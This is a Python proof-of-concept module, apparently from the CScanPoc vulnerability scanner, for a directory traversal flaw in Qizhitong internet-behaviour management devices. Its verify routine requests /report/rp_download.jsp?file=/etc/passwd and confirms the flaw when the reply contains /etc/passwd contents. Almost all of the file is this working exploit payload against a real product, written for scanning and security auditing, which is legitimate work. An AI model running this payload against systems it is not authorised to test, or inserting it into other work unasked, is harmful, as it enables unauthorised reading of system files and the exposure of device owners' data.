# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'QZT360_0001'  # 平台漏洞编号，留空
    name = '企智通系列上网行为管理设备 目录遍历'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_TRAVERSAL  # 漏洞类型
    disclosure_date = '2015-10-11'  # 漏洞公布时间
    desc = '''
        企智通系列上网行为管理设备 /report/rp_download.jsp?file=
        任意文件读取利用，敏感信息泄露，文件操作不当。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '企智通上网行为管理设备'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e00052cb-a2d9-499b-9839-10a8e175c6fa'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # WooYun-2015-145925
            payload = "/report/rp_download.jsp?file=/etc/passwd&null=null"
            verify_url = self.target + payload
            req = requests.get(verify_url)

            if req.status_code == 200 and 'root' in req.content and '/bin/bash' in req.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
